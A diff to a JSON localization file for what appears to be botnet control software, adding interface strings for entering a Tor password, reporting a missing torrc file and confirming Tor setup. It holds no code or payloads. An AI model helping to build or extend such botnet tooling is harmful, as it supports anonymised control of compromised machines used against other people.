@@ -4,7 +4,14 @@
   "enters": {
     "chooseAction": "Choose an action:",
     "chooseLanguage": "Choose a language:",
-    "chooseSettings": "Choose settings:"
+    "chooseSettings": "Choose settings:",
+    "enterTorPassword": "Enter Tor password:"
+  },
+  "errors": {
+    "couldntFindTorrc": "Could not find torrc file"
+  },
+  "logs": {
+    "torConfigured": "Tor configured successfully"
   },
   "choices": {
     "main": [
@@ -29,6 +36,11 @@
         "name": "Change language",
         "description": "Change botnet language",
         "value": "changeLanguage"
+      },
+      {
+        "name": "Change Tor password",
+        "description": "Change password for connecting to Tor",
+        "value": "changeTorPassword"
       },
       {
         "name": "Back",
